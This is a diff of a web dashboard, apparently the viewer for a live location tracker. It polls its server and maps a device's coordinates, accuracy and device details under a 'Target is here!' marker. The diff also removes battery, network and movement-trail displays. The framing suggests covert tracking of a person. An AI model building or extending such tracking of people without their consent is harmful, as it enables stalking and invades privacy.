@@ -20,15 +20,16 @@
             flex-wrap: wrap;
             gap: 10px;
             border-bottom: 2px solid #0f3460;
-            position: relative;
-            z-index: 1001;
         }
         #topBar h1 { font-size: 18px; font-weight: 600; }
         #topBar h1 span { color: #e94560; }
         #topBar .status { font-size: 13px; opacity: 0.8; }
         #topBar .status .dot {
-            display: inline-block; width: 10px; height: 10px;
-            border-radius: 50%; margin-right: 6px;
+            display: inline-block;
+            width: 10px;
+            height: 10px;
+            border-radius: 50%;
+            margin-right: 6px;
             animation: pulse 1.5s infinite;
         }
         @keyframes pulse { 0%, 100% { opacity: 1; } 50% { opacity: 0.3; } }
@@ -45,14 +46,12 @@
             gap: 15px 30px;
             font-size: 13px;
             border-bottom: 1px solid #0f3460;
-            position: relative;
-            z-index: 1000;
         }
         #infoPanel .item { display: flex; align-items: center; gap: 6px; }
         #infoPanel .label { opacity: 0.6; }
         #infoPanel .value { font-weight: 500; color: #fff; }
 
-        #map { height: calc(100vh - 160px); width: 100vw; }
+        #map { height: calc(100vh - 130px); width: 100vw; }
 
         #actions {
             position: absolute;
@@ -64,7 +63,6 @@
             backdrop-filter: blur(8px);
             padding: 12px 20px;
             border-radius: 50px;
-            box-shadow: 0 4px 20px rgba(0,0,0,0.5);
             display: none;
             gap: 12px;
             flex-wrap: wrap;
@@ -72,10 +70,14 @@
             border: 1px solid #0f3460;
         }
         #actions a, #actions button {
-            text-decoration: none; padding: 8px 16px; border-radius: 30px;
-            font-weight: 600; font-size: 13px; border: none;
-            cursor: pointer; transition: all 0.2s;
-            display: inline-flex; align-items: center; gap: 6px;
+            text-decoration: none;
+            padding: 8px 16px;
+            border-radius: 30px;
+            font-weight: 600;
+            font-size: 13px;
+            border: none;
+            cursor: pointer;
+            transition: all 0.2s;
         }
         #actions .btn-google { background: #1a73e8; color: white; }
         #actions .btn-google:hover { background: #1557b0; }
@@ -109,10 +111,18 @@
         #historyPanel::-webkit-scrollbar { width: 4px; }
         #historyPanel::-webkit-scrollbar-thumb { background: #0f3460; border-radius: 4px; }
         .history-toggle {
-            position: absolute; top: 80px; right: 20px; z-index: 1001;
-            background: rgba(22, 33, 62, 0.9); border: 1px solid #0f3460;
-            color: white; padding: 8px 14px; border-radius: 30px;
-            cursor: pointer; font-size: 12px; transition: all 0.2s;
+            position: absolute;
+            top: 80px;
+            right: 20px;
+            z-index: 1001;
+            background: rgba(22, 33, 62, 0.9);
+            border: 1px solid #0f3460;
+            color: white;
+            padding: 8px 14px;
+            border-radius: 30px;
+            cursor: pointer;
+            font-size: 12px;
+            transition: all 0.2s;
         }
         .history-toggle:hover { background: #0f3460; }
 
@@ -139,8 +149,6 @@
 <div id="infoPanel">
     <div class="item"><span class="label">📍 Coordinates:</span><span class="value" id="coordDisplay">--</span></div>
     <div class="item"><span class="label">🎯 Accuracy:</span><span class="value" id="accuracyDisplay">--</span></div>
-    <div class="item"><span class="label">🔋 Battery:</span><span class="value" id="batteryDisplay">--</span></div>
-    <div class="item"><span class="label">📶 Network:</span><span class="value" id="networkDisplay">--</span></div>
     <div class="item"><span class="label">📱 Device:</span><span class="value" id="deviceDisplay">--</span></div>
     <div class="item"><span class="label">🕐 Last update:</span><span class="value" id="timeDisplay">--</span></div>
 </div>
@@ -161,14 +169,15 @@
 </div>
 
 <script>
-    const RENDER_URL = '';
+    const RENDER_URL = '';  // leave empty, dashboard is on same domain
+
     const map = L.map('map').setView([51.505, -0.09], 13);
     L.tileLayer('https://{s}.tile.openstreetmap.org/{z}/{x}/{y}.png', {
         attribution: '© OpenStreetMap contributors'
     }).addTo(map);
 
-    let marker = null, circle = null, pathLine = null, pathCoordinates = [];
-    let currentLat = null, currentLng = null, historyData = [], historyVisible = false;
+    let marker = null, circle = null, currentLat = null, currentLng = null;
+    let historyData = [], historyVisible = false;
 
     function setStatus(text, type = 'waiting') {
         document.getElementById('statusText').textContent = text;
@@ -194,48 +203,31 @@
         return 'Unknown';
     }
 
-    // --- Movement Trail (Feature 7) ---
-    function updatePath(lat, lng) {
-        pathCoordinates.push([lat, lng]);
-        if (pathCoordinates.length > 2) {
-            if (pathLine) map.removeLayer(pathLine);
-            pathLine = L.polyline(pathCoordinates, {
-                color: '#e94560',
-                weight: 3,
-                opacity: 0.7,
-                lineJoin: 'round'
-            }).addTo(map);
-        }
-    }
-
     function fetchLocation() {
         fetch(RENDER_URL + '/get-location')
             .then(response => response.json())
             .then(data => {
                 if (data.lat && data.lng) {
-                    currentLat = data.lat; currentLng = data.lng;
-
-                    document.getElementById('coordDisplay').textContent = `${currentLat.toFixed(6)}, ${currentLng.toFixed(6)}`;
+                    const lat = data.lat, lng = data.lng;
+                    document.getElementById('coordDisplay').textContent = `${lat.toFixed(6)}, ${lng.toFixed(6)}`;
                     document.getElementById('accuracyDisplay').textContent = data.accuracy ? `${data.accuracy.toFixed(0)}m` : '--';
-                    document.getElementById('batteryDisplay').textContent = data.battery ? `${data.battery.level || '--'}%` : '--';
-                    document.getElementById('networkDisplay').textContent = data.network ? data.network.type || '--' : '--';
                     document.getElementById('deviceDisplay').textContent = getDeviceName(data.device_info);
                     document.getElementById('timeDisplay').textContent = formatTime(data.timestamp);
 
-                    map.setView([currentLat, currentLng], 16);
+                    map.setView([lat, lng], 16);
 
                     if (marker) {
-                        marker.setLatLng([currentLat, currentLng]);
+                        marker.setLatLng([lat, lng]);
                     } else {
-                        marker = L.marker([currentLat, currentLng]).addTo(map);
+                        marker = L.marker([lat, lng]).addTo(map);
                         marker.bindPopup('📍 Target is here!').openPopup();
                     }
 
                     if (circle) {
-                        circle.setLatLng([currentLat, currentLng]);
+                        circle.setLatLng([lat, lng]);
                         if (data.accuracy) circle.setRadius(data.accuracy);
                     } else if (data.accuracy) {
-                        circle = L.circle([currentLat, currentLng], {
+                        circle = L.circle([lat, lng], {
                             radius: data.accuracy,
                             color: '#4caf50',
                             fillColor: '#4caf50',
@@ -243,21 +235,16 @@
                         }).addTo(map);
                     }
 
-                    updatePath(currentLat, currentLng);
-
                     document.getElementById('actions').style.display = 'flex';
-                    document.getElementById('googleMapsLink').href = `https://www.google.com/maps?q=${currentLat},${currentLng}`;
-                    document.getElementById('appleMapsLink').href = `http://maps.apple.com/?ll=${currentLat},${currentLng}&q=${currentLat},${currentLng}`;
+                    document.getElementById('googleMapsLink').href = `https://www.google.com/maps?q=${lat},${lng}`;
+                    document.getElementById('appleMapsLink').href = `http://maps.apple.com/?ll=${lat},${lng}&q=${lat},${lng}`;
 
                     setStatus('📍 Location received', 'active');
                 } else {
                     setStatus('⏳ Waiting for location...', 'waiting');
                 }
             })
-            .catch(err => {
-                console.error('Fetch error:', err);
-                setStatus('⚠️ Connection error', 'error');
-            });
+            .catch(err => { console.error('Fetch error:', err); setStatus('⚠️ Connection error', 'error'); });
     }
 
     function fetchHistory() {
@@ -287,12 +274,8 @@
                 .then(() => {
                     if (marker) { marker.remove(); marker = null; }
                     if (circle) { circle.remove(); circle = null; }
-                    if (pathLine) { pathLine.remove(); pathLine = null; }
-                    pathCoordinates = [];
                     document.getElementById('coordDisplay').textContent = '--';
                     document.getElementById('accuracyDisplay').textContent = '--';
-                    document.getElementById('batteryDisplay').textContent = '--';
-                    document.getElementById('networkDisplay').textContent = '--';
                     document.getElementById('deviceDisplay').textContent = '--';
                     document.getElementById('timeDisplay').textContent = '--';
                     document.getElementById('actions').style.display = 'none';
@@ -317,11 +300,9 @@
     fetchLocation();
     setInterval(fetchHistory, 10000);
 
-    window.addEventListener('resize', function() {
-        setTimeout(function() { map.invalidateSize(); }, 200);
-    });
+    window.addEventListener('resize', function() { setTimeout(function() { map.invalidateSize(); }, 200); });
 
-    console.log('📍 Live Tracker Dashboard initialized');
+    console.log('📍 Dashboard initialized');
 </script>
 </body>
 </html>
